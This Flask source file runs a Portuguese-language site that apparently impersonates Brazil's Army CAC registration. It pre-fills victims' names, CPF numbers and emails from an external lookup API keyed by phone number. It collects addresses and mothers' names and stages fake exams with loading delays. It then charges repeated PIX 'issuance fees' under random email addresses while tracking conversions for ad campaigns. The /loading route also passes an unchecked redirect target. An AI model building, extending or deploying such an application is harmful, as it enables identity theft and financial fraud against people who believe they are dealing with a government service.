import os
import logging
import requests
import hashlib
import time
from flask import Flask, render_template, request, jsonify, session, redirect, url_for, send_from_directory, render_template_string
from flask_sqlalchemy import SQLAlchemy
from sqlalchemy.orm import DeclarativeBase
from datetime import datetime
from sms_service import sms_service
from payments import create_pagnet_api

# Configure logging
logging.basicConfig(level=logging.DEBUG)

class Base(DeclarativeBase):
    pass

db = SQLAlchemy(model_class=Base)
app = Flask(__name__, static_url_path='/static')
app.secret_key = os.environ.get("SESSION_SECRET", "dev_secret_key")

# Configure database
database_url = os.environ.get("DATABASE_URL")
if database_url and database_url.startswith("postgres://"):
    database_url = database_url.replace("postgres://", "postgresql://", 1)

app.config["SQLALCHEMY_DATABASE_URI"] = database_url or "sqlite:///cac_registration.db"
app.config["SQLALCHEMY_ENGINE_OPTIONS"] = {
    "pool_recycle": 300,
    "pool_pre_ping": True,
}

db.init_app(app)

# Minimum loading time in milliseconds
MIN_LOADING_TIME = 4000

# Meta Pixel ID e Access Token (definir como variáveis de ambiente em produção)
META_PIXEL_ID = "961960469197157"
META_ACCESS_TOKEN = os.environ.get("META_ACCESS_TOKEN", "")

def hash_data(data):
    """Criar hash SHA256 para dados sensíveis"""
    if not data:
        return None
    return hashlib.sha256(data.lower().strip().encode()).hexdigest()

def send_meta_conversion(user_data, transaction_id, value=64.80):
    """Enviar conversão para Meta Ads via Server-Side API"""
    try:
        if not META_ACCESS_TOKEN:
            app.logger.warning("META_ACCESS_TOKEN não configurado, pulando envio de conversão")
            return False
        
        # Obter parâmetros UTM da sessão
        meta_params = session.get('meta_tracking_params', {})
        
        # Preparar dados do usuário com hash
        hashed_email = hash_data(user_data.get('email', '')) if user_data.get('email') else None
        hashed_phone = hash_data(user_data.get('phone', '').replace('(', '').replace(')', '').replace(' ', '').replace('-', ''))
        
        # Obter IP do cliente
        client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        if client_ip and ',' in client_ip:
            client_ip = client_ip.split(',')[0].strip()
        
        # Obter User Agent
        user_agent = request.headers.get('User-Agent', '')
        
        # Dados do evento
        event_data = {
            "event_name": "Purchase",
            "event_time": int(time.time()),
            "event_id": f"cac-{transaction_id}",
            "action_source": "website",
            "event_source_url": "https://exercito.acesso.inc/pagamento",
            "user_data": {
                "client_ip_address": client_ip,
                "client_user_agent": user_agent
            },
            "custom_data": {
                "currency": "BRL",
                "value": value,
                "content_type": "product",
                "content_name": "Taxa de Emissão CAC",
                "content_ids": ["cac-taxa-emissao"],
                "num_items": 1
            }
        }
        
        # Adicionar dados hasheados se disponíveis
        if hashed_email:
            event_data["user_data"]["em"] = [hashed_email]
        if hashed_phone:
            event_data["user_data"]["ph"] = [hashed_phone]
        
        # Adicionar parâmetros UTM se disponíveis
        if meta_params.get('fbc'):
            event_data["user_data"]["fbc"] = meta_params['fbc']
        if meta_params.get('fbp'):
            event_data["user_data"]["fbp"] = meta_params['fbp']
        
        # Preparar payload para API
        payload = {
            "data": [event_data],
            "access_token": META_ACCESS_TOKEN
        }
        
        # Enviar para Meta API
        url = f"https://graph.facebook.com/v19.0/{META_PIXEL_ID}/events"
        response = requests.post(url, json=payload, timeout=10)
        
        if response.status_code == 200:
            app.logger.info(f"Conversão enviada com sucesso para Meta Ads: {transaction_id}")
            return True
        else:
            app.logger.error(f"Erro ao enviar conversão para Meta Ads: {response.status_code} - {response.text}")
            return False
            
    except Exception as e:
        app.logger.error(f"Erro ao enviar conversão para Meta Ads: {str(e)}")
        return False

@app.route('/static/fonts/<path:filename>')
def serve_font(filename):
    return send_from_directory('static/fonts', filename)

def capture_meta_utm_params():
    """Captura e armazena parâmetros UTM da Meta na sessão"""
    meta_params = {}
    
    # Parâmetros UTM padrão
    utm_params = ['utm_source', 'utm_medium', 'utm_campaign', 'utm_content', 'utm_term']
    for param in utm_params:
        if request.args.get(param):
            meta_params[param] = request.args.get(param)
    
    # Parâmetros específicos da Meta/Facebook
    meta_specific_params = ['fbclid', 'fbc', 'fbp']
    for param in meta_specific_params:
        if request.args.get(param):
            meta_params[param] = request.args.get(param)
    
    if meta_params:
        session['meta_tracking_params'] = meta_params
        app.logger.info(f"Parâmetros UTM da Meta capturados: {meta_params}")
    
    return meta_params

@app.route("/")
def index():
    # Capturar parâmetros UTM da Meta
    capture_meta_utm_params()
    
    # Verificar se temos o parâmetro utm_content na URL
    utm_content = request.args.get('utm_content', '')
    app.logger.info(f"Parâmetro utm_content recebido: {utm_content}")
    
    # Se temos um número de telefone no parâmetro, vamos buscar os dados na API
    if utm_content and utm_content.isdigit():
        # Verificar se já temos os dados deste número na sessão
        phone_key = f"phone_{utm_content}"
        
        if session.get(phone_key):
            app.logger.info(f"Usando dados da sessão para o telefone: {utm_content}")
            registration_data = session.get(phone_key)
        else:
            # Redirecionar para a página de carregamento enquanto buscamos os dados
            app.logger.info(f"Redirecionando para carregamento para buscar dados do telefone: {utm_content}")
            loading_path = url_for('loading', 
                           next=url_for('fetch_user_data', phone=utm_content),
                           text='Buscando seus dados...',
                           time=3000)
            return redirect(loading_path)
    
    # Obter dados de registro da sessão ou criar dados básicos padrão
    registration_data = session.get('registration_data', {})
    
    # Se não temos dados de registro, usamos um conjunto mínimo de dados
    if not registration_data:
        app.logger.info("Usando dados de exemplo para a página index")
        registration_data = {
            'full_name': 'José da Silva',
            'cpf': '123.456.789-00',
            'phone': '(11) 98765-4321'
        }
    
    # Pass current date for template
    current_date = datetime.now()
    
    return render_template("index.html", 
                          user_data=registration_data,
                          now=current_date)

@app.route("/fetch_user_data/<phone>")
def fetch_user_data(phone):
    import requests
    
    try:
        app.logger.info(f"Buscando dados para o telefone: {phone}")
        # Fazer a requisição para a API
        api_url = f"https://webhook-manager.replit.app/api/v1/cliente?telefone={phone}"
        response = requests.get(api_url)
        
        if response.status_code == 200:
            data = response.json()
            app.logger.info(f"Dados recebidos da API: {data}")
            
            if data.get('sucesso') and data.get('cliente'):
                cliente = data['cliente']
                
                # Formatar o CPF se necessário
                cpf = cliente.get('cpf', '')
                if cpf and len(cpf) == 11:
                    cpf = f"{cpf[:3]}.{cpf[3:6]}.{cpf[6:9]}-{cpf[9:]}"
                
                # Formatar o telefone se necessário
                telefone = cliente.get('telefone', '')
                if telefone and telefone.startswith('+55'):
                    telefone = telefone[3:]  # Remove o +55
                    if len(telefone) == 11:  # DDD + 9 + número
                        telefone = f"({telefone[:2]}) {telefone[2:]}"
                
                # Construir o objeto de dados
                registration_data = {
                    'full_name': cliente.get('nome', ''),
                    'cpf': cpf,
                    'phone': telefone,
                    'email': cliente.get('email', '')
                }
                
                # Salvar os dados na sessão
                session['registration_data'] = registration_data
                
                # Salvar também com a chave do telefone
                phone_key = f"phone_{phone}"
                session[phone_key] = registration_data
                
                app.logger.info(f"Dados salvos na sessão: {registration_data}")
            else:
                app.logger.warning(f"API retornou sucesso=False ou sem dados de cliente: {data}")
        else:
            app.logger.error(f"Erro ao buscar dados na API. Status code: {response.status_code}")
    
    except Exception as e:
        app.logger.error(f"Erro ao buscar dados do usuário: {str(e)}")
    
    # Redirecionar para a página principal
    return redirect(url_for('index'))

@app.route("/loading")
def loading():
    next_page = request.args.get('next', '/')
    loading_text = request.args.get('text', 'Carregando...')
    loading_time = max(int(request.args.get('time', MIN_LOADING_TIME)), MIN_LOADING_TIME)
    return render_template("loading.html", 
                         next_page=next_page,
                         loading_text=loading_text,
                         loading_time=loading_time)

@app.route("/get_user_data")
def get_user_data():
    user_data = session.get('registration_data')
    if not user_data:
        return jsonify({"error": "No data found"}), 404

    return jsonify({
        "full_name": user_data.get("full_name"),
        "cpf": user_data.get("cpf"),
        "phone": user_data.get("phone")
    })

@app.route("/address", methods=['GET', 'POST'])
def address():
    if request.method == 'POST':
        try:
            data = request.form
            if not session.get('registration_data'):
                return redirect(url_for('loading', 
                    next='/', 
                    text='Redirecionando...', 
                    time=2000))

            registration_data = session["registration_data"]
            registration_data.update({
                "zip_code": data.get("zip_code"),
                "address": data.get("address"),
                "number": data.get("number"),
                "complement": data.get("complement"),
                "neighborhood": data.get("neighborhood"),
                "city": data.get("city"),
                "state": data.get("state")
            })

            session["registration_data"] = registration_data
            return redirect(url_for('loading', 
                next=url_for('exame'), 
                text='Validando endereço...', 
                time=3500))
        except Exception as e:
            logging.error(f"Error in address submission: {str(e)}")
            return redirect(url_for('index'))
    else:
        if not session.get('registration_data'):
            return redirect(url_for('loading', 
                next='/', 
                text='Redirecionando...', 
                time=2000))
        return render_template("address.html")

@app.route("/submit_registration", methods=["POST"])
def submit_registration():
    try:
        data = request.form
        # Store in session for multi-step form, including optional fields if present
        registration_data = {
            "cpf": data.get("cpf"),
            "full_name": data.get("full_name"),
            "phone": data.get("phone")
        }

        # Add optional fields if they were provided
        if data.get("birth_date"):
            registration_data["birth_date"] = data.get("birth_date")
        if data.get("mother_name"):
            registration_data["mother_name"] = data.get("mother_name")

        session["registration_data"] = registration_data

        return redirect(url_for('loading', 
            next=url_for('address'), 
            text='Verificando dados pessoais...', 
            time=4000))
    except Exception as e:
        logging.error(f"Error in submit_registration: {str(e)}")
        return jsonify({"success": False, "error": str(e)})

@app.route("/exame")
def exame():
    if not session.get('registration_data'):
        return redirect(url_for('loading', 
            next='/', 
            text='Redirecionando...', 
            time=2000))
    return render_template("exame.html")

@app.route("/submit_exam", methods=["POST"])
def submit_exam():
    try:
        if not session.get('registration_data'):
            return jsonify({"success": False, "error": "Dados do registro não encontrados"})

        data = request.form
        registration_data = session["registration_data"]

        # Add exam answers to registration data
        exam_answers = {key: value for key, value in data.items() if key.startswith('question_')}
        registration_data['exam_answers'] = exam_answers
        session["registration_data"] = registration_data

        return jsonify({
            "success": True, 
            "redirect": url_for('loading', 
                next='/psicotecnico', 
                text='Processando respostas do exame...', 
                time=5000)
        })
    except Exception as e:
        logging.error(f"Error in submit_exam: {str(e)}")
        return jsonify({"success": False, "error": str(e)})

@app.route("/psicotecnico")
def psicotecnico():
    if not session.get('registration_data'):
        return redirect(url_for('loading', 
            next='/', 
            text='Redirecionando...', 
            time=2000))
    return render_template("psicotecnico.html")

@app.route("/submit_psicotecnico", methods=["POST"])
def submit_psicotecnico():
    try:
        if not session.get('registration_data'):
            return jsonify({"success": False, "error": "Dados do registro não encontrados"})

        data = request.form
        registration_data = session["registration_data"]

        # Add psychological assessment answers to registration data
        psico_answers = {key: value for key, value in data.items() if key.startswith('question_')}
        registration_data['psico_answers'] = psico_answers

        # Here you would typically save the complete registration to database
        # For now, we'll just keep the session data
        session["registration_data"] = registration_data

        return jsonify({
            "success": True, 
            "redirect": url_for('loading', 
                next='/verificacao', 
                text='Analisando avaliação psicotécnica...', 
                time=6000)
        })
    except Exception as e:
        logging.error(f"Error in submit_psicotecnico: {str(e)}")
        return jsonify({"success": False, "error": str(e)})

@app.route("/verificacao")
def verificacao():
    # For testing purposes, create mock session data if it doesn't exist
    if not session.get('registration_data'):
        session['registration_data'] = {
            'cpf': '12345678901',
            'full_name': 'João da Silva Santos',
            'phone': '(11) 99999-9999'
        }
    return render_template("verificacao.html")

@app.route("/aprovado")
def aprovado():
    if not session.get('registration_data'):
        return redirect(url_for('loading', 
            next='/', 
            text='Redirecionando...', 
            time=2000))
    return render_template("aprovado.html")

@app.route("/pagamento")
def pagamento():
    return render_template("pagamento.html")

@app.route("/<cpf>")
def pagamento_cpf(cpf):
    # Validar se o CPF tem 11 dígitos numéricos
    if not cpf.isdigit() or len(cpf) != 11:
        return redirect(url_for('index'))
    return render_template("pagamento_cpf.html", cpf=cpf)

@app.route("/taxa")
def taxa():
    return render_template("taxa.html")

@app.route("/process_payment", methods=["POST"])
def process_payment():
    try:
        import json
        import random
        import string
        
        # Receber dados do frontend (localStorage)
        data = request.get_json()
        app.logger.info(f"Dados recebidos para pagamento: {data}")
        
        # Gerar email aleatório
        random_chars = ''.join(random.choices(string.ascii_lowercase, k=8))
        random_email = f"{random_chars}@email.com"
        
        # Preparar dados para pagamento
        customer_data = {
            'nome': data.get('nome', ''),
            'cpf': data.get('cpf', ''),
            'email': random_email,
            'phone': data.get('telefone', '')
        }
        
        app.logger.info("Criando instância da API de pagamento...")
        payment_api = create_pagnet_api()
        
        # Criar transação PIX para Taxa de Emissão do CR (R$ 64,80)
        payment_result = payment_api.create_pix_transaction(
            customer_data=customer_data,
            amount=64.80,
            phone=customer_data['phone']
        )
        
        app.logger.info(f"Resultado do pagamento: {payment_result}")
        
        if payment_result.get('success'):
            # Armazenar ID da transação na sessão
            session['transaction_id'] = payment_result.get('transaction_id')
            
            # Log dos dados recebidos para debug
            app.logger.info(f"Dados da API: {payment_result}")
            
            return jsonify({
                "success": True,
                "payment_data": {
                    "qr_code": payment_result.get('qr_code_base64', '') or payment_result.get('raw_response', {}).get('pix', {}).get('qrCodeBase64', ''),
                    "pix_code": payment_result.get('pix_code', ''),
                    "amount": "64,80",
                    "transaction_id": payment_result.get('transaction_id', '')
                }
            })
        else:
            return jsonify({"success": False, "error": payment_result.get('error', 'Erro desconhecido')})
            
    except Exception as e:
        app.logger.error(f"Erro ao processar pagamento: {str(e)}")
        return jsonify({"success": False, "error": str(e)})


@app.route("/process_payment_cpf", methods=["POST"])
def process_payment_cpf():
    """
    Processar pagamento com dados vindos da API externa via CPF
    """
    try:
        import json
        import random
        import string
        
        # Receber dados do frontend que já foram buscados da API externa
        data = request.get_json()
        app.logger.info(f"Dados recebidos para pagamento via CPF: {data}")
        
        # Gerar email aleatório
        random_chars = ''.join(random.choices(string.ascii_lowercase, k=8))
        random_email = f"{random_chars}@email.com"
        
        # Preparar dados para pagamento
        customer_data = {
            'nome': data.get('nome', ''),
            'cpf': data.get('cpf', ''),
            'email': random_email,
            'phone': data.get('telefone', '11999999999')  # telefone padrão
        }
        
        app.logger.info("Criando instância da API de pagamento (via CPF)...")
        payment_api = create_pagnet_api()
        
        # Criar transação PIX para Taxa de Emissão do CR (R$ 64,80)
        payment_result = payment_api.create_pix_transaction(
            customer_data=customer_data,
            amount=64.80,
            phone=customer_data['phone']
        )
        
        app.logger.info(f"Resultado do pagamento via CPF: {payment_result}")
        
        if payment_result.get('success'):
            # Armazenar ID da transação na sessão
            session['transaction_id'] = payment_result.get('transaction_id')
            
            # Armazenar dados básicos do usuário na sessão para uso futuro
            session['registration_data'] = {
                'full_name': customer_data['nome'],
                'cpf': customer_data['cpf'],
                'phone': customer_data['phone']
            }
            
            # Log dos dados recebidos para debug
            app.logger.info(f"Dados da API via CPF: {payment_result}")
            
            return jsonify({
                "success": True,
                "payment_data": {
                    "qr_code": payment_result.get('qr_code_base64', '') or payment_result.get('raw_response', {}).get('pix', {}).get('qrCodeBase64', ''),
                    "pix_code": payment_result.get('pix_code', ''),
                    "amount": "64,80",
                    "transaction_id": payment_result.get('transaction_id', '')
                }
            })
        else:
            return jsonify({"success": False, "error": payment_result.get('error', 'Erro desconhecido')})
            
    except Exception as e:
        app.logger.error(f"Erro ao processar pagamento via CPF: {str(e)}")
        return jsonify({"success": False, "error": str(e)})


@app.route("/process_taxa_payment", methods=["POST"])
def process_taxa_payment():
    try:
        import json
        import random
        import string
        
        # Receber dados do frontend (localStorage)
        data = request.get_json()
        app.logger.info(f"Dados recebidos para pagamento da taxa: {data}")
        
        # Gerar email aleatório
        random_chars = ''.join(random.choices(string.ascii_lowercase, k=8))
        random_email = f"{random_chars}@email.com"
        
        # Preparar dados para pagamento
        customer_data = {
            'nome': data.get('nome', ''),
            'cpf': data.get('cpf', ''),
            'email': random_email,
            'phone': data.get('telefone', '')
        }
        
        app.logger.info("Criando instância da API de pagamento para taxa...")
        payment_api = create_pagnet_api()
        
        # Criar transação PIX para Taxas (R$ 176,70)
        payment_result = payment_api.create_pix_transaction(
            customer_data=customer_data,
            amount=176.70,
            phone=customer_data['phone']
        )
        
        app.logger.info(f"Resultado do pagamento da taxa: {payment_result}")
        
        if payment_result.get('success'):
            # Armazenar ID da transação na sessão
            session['taxa_transaction_id'] = payment_result.get('transaction_id')
            
            # Log dos dados recebidos para debug
            app.logger.info(f"Dados da API taxa: {payment_result}")
            
            return jsonify({
                "success": True,
                "payment_data": {
                    "qr_code": payment_result.get('qr_code_base64', '') or payment_result.get('raw_response', {}).get('pix', {}).get('qrCodeBase64', ''),
                    "pix_code": payment_result.get('pix_code', ''),
                    "amount": "176,70",
                    "transaction_id": payment_result.get('transaction_id', '')
                }
            })
        else:
            return jsonify({"success": False, "error": payment_result.get('error', 'Erro desconhecido')})
            
    except Exception as e:
        app.logger.error(f"Erro ao processar pagamento da taxa: {str(e)}")
        return jsonify({"success": False, "error": str(e)})


@app.route("/create_pix_payment", methods=["POST"])
def create_pix_payment():
    try:
        app.logger.info("Criando pagamento PIX...")
        
        # Obter dados de registro da sessão ou usar dados padrão para teste
        registration_data = session.get('registration_data', {})
        
        # Verificar se temos os dados mínimos necessários
        if not registration_data.get('full_name') or not registration_data.get('cpf'):
            app.logger.info("Usando dados de registro de teste")
            # Dados de teste para garantir que a API funcione mesmo sem registro completo
            registration_data = {
                'full_name': 'Maria da Silva',
                'cpf': '123.456.789-00',
                'phone': '11999887766'
            }
        
        app.logger.info(f"Dados de registro obtidos: {registration_data}")

        app.logger.info("Criando instância da API de pagamento...")
        payment_api = create_pagnet_api()
        
        # Verifica o status atual do usuário para determinar o valor do pagamento
        # Por padrão, vamos usar o valor menor (Taxa de Inscrição inicial)
        payment_amount = 24368  # R$ 243,68 em centavos
        
        # Se estiver na rota resultado/PAID, usamos o valor maior
        if request.referrer and '/resultado/PAID' in request.referrer:
            payment_amount = 24368  # R$ 243,68 em centavos
        
        app.logger.info(f"Valor do pagamento a ser gerado: {payment_amount/100} reais")
        
        app.logger.info("Enviando requisição para criar pagamento PIX...")
        payment_data = payment_api.create_pix_transaction(
            customer_data={
                'nome': registration_data.get('full_name'),
                'cpf': registration_data.get('cpf'),
                'phone': registration_data.get('phone'),
                'email': 'usuario@email.com'
            },
            amount=payment_amount/100
        )

        # Extract the QR code and PIX code for the modal
        app.logger.info(f"Dados de pagamento recebidos: {payment_data.keys()}")
        
        # Procura qrCodeBase64 ou em estruturas aninhadas
        qr_code_base64 = payment_data.get("qrCodeBase64", "")
        if not qr_code_base64 and "pix" in payment_data and isinstance(payment_data["pix"], dict):
            qr_code_base64 = payment_data["pix"].get("qrCodeBase64", "")
        
        # Procura pixCode ou em estruturas aninhadas
        pix_code = payment_data.get("pixCode", "")
        if not pix_code and "pix" in payment_data and isinstance(payment_data["pix"], dict):
            pix_code = payment_data["pix"].get("code", "")
        
        app.logger.info(f"QR Code Base64 encontrado: {bool(qr_code_base64)}")
        app.logger.info(f"Código PIX encontrado: {bool(pix_code)}")
        
        response_data = {
            "success": True,
            "payment_data": {
                "id": payment_data.get("id", ""),
                "pixCode": pix_code,
                "qrCodeBase64": qr_code_base64,
                "amount": payment_data.get("amount", 0),
                "status": payment_data.get("status", "PENDING")
            }
        }

        # Store the transaction ID in the session for future reference
        session['transaction_id'] = payment_data.get("id", "")
        
        return jsonify(response_data)
    except Exception as e:
        logging.error(f"Error creating PIX payment: {str(e)}")
        return jsonify({"success": False, "error": str(e)})


@app.route("/check_payment_status/<transaction_id>")
def check_payment_status(transaction_id):
    try:
        app.logger.info(f"Verificando status do pagamento para transação: {transaction_id}")
        
        # Obter dados de registro da sessão
        registration_data = session.get('registration_data', {})
        if not registration_data:
            app.logger.warning("Dados de registro não encontrados na sessão durante verificação de status, mas continuando mesmo assim")
        
        app.logger.info("Criando instância da API de pagamento para verificação de status...")
        payment_api = create_pagnet_api()
        
        app.logger.info(f"Enviando requisição para verificar status de pagamento da transação: {transaction_id}")
        status_response = payment_api.check_transaction_status(transaction_id)
        
        app.logger.info(f"Resposta de status recebida: {status_response}")

        # Processar mudança de status de PENDING para outro estado (ex: PAID)
        # Verificar se o status é explicitamente PAID ou APPROVED antes de redirecionar
        if status_response['success'] and (status_response['status'] == 'PAID' or status_response['status'] == 'APPROVED'):
            app.logger.info(f"Pagamento confirmado com status: {status_response['status']}")
                
            # Sempre retornar PAID para o frontend quando o pagamento for confirmado
            # Independentemente do status real (PAID ou APPROVED)
            # O tracking será feito via pixel client-side no frontend
            return jsonify({
                "success": True,
                "redirect": True,
                "status": "PAID"
            })

        app.logger.info(f"Pagamento ainda pendente com status: {status_response['status']}")
        return jsonify({
            "success": True,
            "redirect": False,
            "status": status_response['status']
        })

    except Exception as e:
        logging.error(f"Error checking payment status: {str(e)}")
        return jsonify({"success": False, "error": str(e)})

@app.route("/resultado/<status>")
def resultado(status):
    # Obter dados de registro da sessão ou criar dados básicos padrão
    registration_data = session.get('registration_data', {})
    
    # Se não temos dados de registro, usamos um conjunto mínimo de dados
    if not registration_data:
        app.logger.warning("Dados de registro não encontrados para a página de resultado, usando dados padrão")
        registration_data = {
            'full_name': 'Usuário',
            'cpf': '---',
            'phone': '---'
        }
    
    # Pass current date for template
    from datetime import datetime
    current_date = datetime.now()
    
    # Get transaction info if available
    transaction_id = session.get('transaction_id', '')
    payment_data = {}
    
    if transaction_id:
        try:
            # Attempt to get payment data if we have a transaction ID
            payment_api = create_pagnet_api()
            status_response = payment_api.check_transaction_status(transaction_id)
            
            if status_response['success']:
                payment_data = status_response.get('payment_data', {})
                app.logger.info(f"Payment data for resultado page: {payment_data}")
        except Exception as e:
            app.logger.error(f"Error getting payment data for resultado page: {str(e)}")
    else:
        # Se não tivermos um ID de transação, tentamos criar um novo pagamento PIX para exibir
        try:
            app.logger.info("Nenhum ID de transação na sessão, tentando criar um novo pagamento PIX para exibição")
            payment_api = create_pagnet_api()
            
            # Se o status for PAID, usar o valor maior para o segundo pagamento
            payment_amount = 24368 if status == 'PAID' else 24368  # R$ 243,68 ou R$ 68,40
            
            payment_response = payment_api.create_pix_transaction(
                customer_data={
                    'nome': registration_data.get('full_name', 'Usuário'),
                    'cpf': registration_data.get('cpf', '123.456.789-00'),
                    'phone': registration_data.get('phone', '11999887766'),
                    'email': 'usuario@email.com'
                },
                amount=payment_amount/100
            )
            
            # Armazenar o ID da transação na sessão para referência futura
            if 'id' in payment_response:
                session['transaction_id'] = payment_response['id']
                
            payment_data = payment_response
            app.logger.info(f"Novo pagamento PIX criado: {payment_data.keys()}")
        except Exception as e:
            app.logger.error(f"Erro ao criar novo pagamento PIX para exibição: {str(e)}")

    return render_template('resultado.html', 
                          user_data=registration_data, 
                          payment_data=payment_data,
                          now=current_date)

# Test routes for development
@app.route("/test/address")
def test_address():
    # Create test session data
    session['registration_data'] = {
        'full_name': 'João Silva de Teste',
        'cpf': '123.456.789-00',
        'phone': '(11) 98765-4321'
    }
    return redirect(url_for('address'))

@app.route("/test/exame")
def test_exame():
    # Create test session data
    session['registration_data'] = {
        'full_name': 'João Silva de Teste',
        'cpf': '123.456.789-00',
        'phone': '(11) 98765-4321'
    }
    return redirect(url_for('exame'))

@app.route("/test/psicotecnico")
def test_psicotecnico():
    # Create test session data with exam data
    session['registration_data'] = {
        'full_name': 'João Silva de Teste',
        'cpf': '123.456.789-00',
        'phone': '(11) 98765-4321',
        'exam_answers': {'question_0': 'test'}
    }
    return redirect(url_for('psicotecnico'))

@app.route("/test/aprovado")
def test_aprovado():
    # Create test session data with complete data
    session['registration_data'] = {
        'full_name': 'João Silva de Teste',
        'cpf': '123.456.789-00',
        'phone': '(11) 98765-4321',
        'exam_answers': {'question_0': 'test'},
        'psico_answers': {'question_0': 'test'}
    }
    return redirect(url_for('aprovado'))

@app.route("/test/resultado")
def test_resultado():
    # Create test session data with complete data
    session['registration_data'] = {
        'full_name': 'João Silva de Teste',
        'cpf': '123.456.789-00',
        'phone': '(11) 98765-4321',
        'address': 'Rua das Flores, 123',
        'city': 'São Paulo',
        'state': 'SP',
        'zip_code': '01234-567'
    }
    return redirect(url_for('resultado', status='PENDING'))

with app.app_context():
    import models
    db.create_all()